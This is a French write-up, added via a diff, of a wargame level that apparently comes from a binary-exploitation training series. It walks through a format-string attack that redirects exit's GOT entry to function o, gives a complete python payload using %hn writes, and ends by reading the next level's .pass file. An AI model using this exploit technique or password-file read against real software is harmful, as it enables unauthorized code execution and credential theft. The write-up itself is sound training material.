@@ -1,0 +1,31 @@
+Il s'agit ici encore une fois d'une format string.
+Ici le but est de changer l'adresse a executer, donc remplacer exit
+par la fonction O.
+Pour cela il faut trouver exit:
+
+objdump -R level5
+08049838 R_386_JUMP_SLOT   exit
+
+puis trouver o:
+
+objdump -t level5 | grep "o"
+080484a4 g     F .text	0000001e              o
+
+puis nous avons trouve la place de printf grace a %p == 4.
+
+puis nous avons calcule la valeur necessaire pour reproduire l'adresse de o
+
+0804 = 2052
+
+qui devient 2044 car on retire 8 bytes.
+
+84a4 = 33956
+
+qui devient 31904 car on retire la premiere adresse, puis 8 bytes.
+
+du coups ca nous donne ca:
+
+python -c "print '\x38\x98\x04\x08\x3a\x98\x04\x08' + '%2044x' + '%5\$hn' + '%31904x' + '%4\$hn'" > /tmp/level6
+
+cat ../level6/.pass
+
